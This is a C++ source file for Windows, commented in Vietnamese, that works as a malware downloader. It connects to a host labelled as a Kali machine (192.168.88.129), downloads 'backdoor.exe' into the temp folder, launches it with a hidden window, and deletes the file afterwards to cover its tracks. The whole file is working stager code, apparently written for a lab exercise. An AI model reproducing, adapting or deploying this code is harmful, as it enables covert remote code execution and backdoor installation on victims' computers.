#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <ShlObj.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Shell32.lib")

// Thêm manifest để yêu cầu quyền admin nếu cần
#pragma comment(linker, "\"/manifestdependency:type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Hàm hiển thị thông báo lỗi
void ShowErrorMessage(LPCWSTR message, DWORD errorCode)
{
    WCHAR errorBuffer[256] = {0};
    WCHAR fullMessage[512] = {0};

    FormatMessageW(
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        errorBuffer,
        sizeof(errorBuffer) / sizeof(WCHAR),
        NULL);

    swprintf_s(fullMessage, L"%s\nError code: %d\nMessage: %s", message, errorCode, errorBuffer);
    MessageBoxW(NULL, fullMessage, L"Error", MB_ICONERROR | MB_OK);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Kiểm tra phiên bản Windows
    OSVERSIONINFOEXW osInfo;
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEXW));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

    // Sử dụng cách xác định phiên bản Windows mới
    typedef NTSTATUS(WINAPI * RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod)
    {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (RtlGetVersion)
        {
            RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo);
        }
    }

    // Lấy đường dẫn thư mục temp
    WCHAR tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath))
    {
        ShowErrorMessage(L"Failed to get temp directory", GetLastError());
        return 1;
    }

    // Tạo đường dẫn đầy đủ cho file backdoor
    std::wstring backdoorPath = std::wstring(tempPath) + L"backdoor.exe";

    // URL của server - IP của máy Kali
    const wchar_t *serverAddress = L"192.168.88.129";
    const wchar_t *filePath = L"/backdoor.exe";

    // Khởi tạo WinInet
    HINTERNET hInternet = InternetOpenW(
        L"Downloader",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0);

    if (!hInternet)
    {
        ShowErrorMessage(L"Failed to initialize WinInet", GetLastError());
        return 1;
    }

    // Thiết lập timeout để tránh treo
    DWORD timeout = 30000; // 30 giây
    InternetSetOptionW(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Kết nối tới server
    HINTERNET hConnect = InternetConnectW(
        hInternet,
        serverAddress,
        INTERNET_DEFAULT_HTTP_PORT,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0);

    if (!hConnect)
    {
        ShowErrorMessage(L"Failed to connect to server", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Mở HTTP request
    HINTERNET hRequest = HttpOpenRequestW(
        hConnect,
        L"GET",
        filePath,
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        0);

    if (!hRequest)
    {
        ShowErrorMessage(L"Failed to open HTTP request", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Gửi request
    BOOL result = HttpSendRequestW(
        hRequest,
        NULL,
        0,
        NULL,
        0);

    if (!result)
    {
        ShowErrorMessage(L"Failed to send HTTP request", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Kiểm tra HTTP status code
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (!HttpQueryInfoW(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL))
    {
        ShowErrorMessage(L"Failed to get HTTP status code", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    if (statusCode != 200)
    {
        wchar_t errorMsg[100];
        swprintf_s(errorMsg, L"Server returned non-200 status code: %d", statusCode);
        MessageBoxW(NULL, errorMsg, L"HTTP Error", MB_ICONERROR | MB_OK);
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Tạo file để lưu backdoor
    HANDLE hFile = CreateFileW(
        backdoorPath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        ShowErrorMessage(L"Failed to create file", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Tải và lưu nội dung
    BYTE buffer[8192]; // Tăng kích thước buffer
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    DWORD totalBytesRead = 0;
    const DWORD maxSize = 100 * 1024 * 1024; // Giới hạn tối đa 100MB

    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
    {
        totalBytesRead += bytesRead;
        if (totalBytesRead > maxSize)
        {
            MessageBoxW(NULL, L"File too large, download aborted", L"Warning", MB_ICONWARNING | MB_OK);
            break;
        }

        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead)
        {
            ShowErrorMessage(L"Failed to write to file", GetLastError());
            CloseHandle(hFile);
            DeleteFileW(backdoorPath.c_str());
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return 1;
        }
    }

    // Đóng file và các handle
    CloseHandle(hFile);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // Thực thi backdoor ẩn
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Chạy ẩn

    ZeroMemory(&pi, sizeof(pi));

    // Thực thi backdoor với quyền thừa kế từ quá trình hiện tại
    if (CreateProcessW(
            backdoorPath.c_str(),
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED, // Tạo suspended để có thể thiết lập thêm thuộc tính
            NULL,
            NULL,
            &si,
            &pi))
    {

        // Sử dụng Job object để quản lý quá trình con tốt hơn (Windows 10 feature)
        HANDLE hJob = CreateJobObjectW(NULL, NULL);
        if (hJob)
        {
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jobInfo = {0};
            jobInfo.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
            SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jobInfo, sizeof(jobInfo));
            AssignProcessToJobObject(hJob, pi.hProcess);
        }

        // Tiếp tục quá trình
        ResumeThread(pi.hThread);

        // Đợi một chút để đảm bảo quá trình đã bắt đầu
        Sleep(2000);

        // Đóng handle
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (hJob)
            CloseHandle(hJob);

        // Xóa file backdoor
        DeleteFileW(backdoorPath.c_str());
    }
    else
    {
        ShowErrorMessage(L"Failed to execute process", GetLastError());
        DeleteFileW(backdoorPath.c_str());
        return 1;
    }

    return 0;
}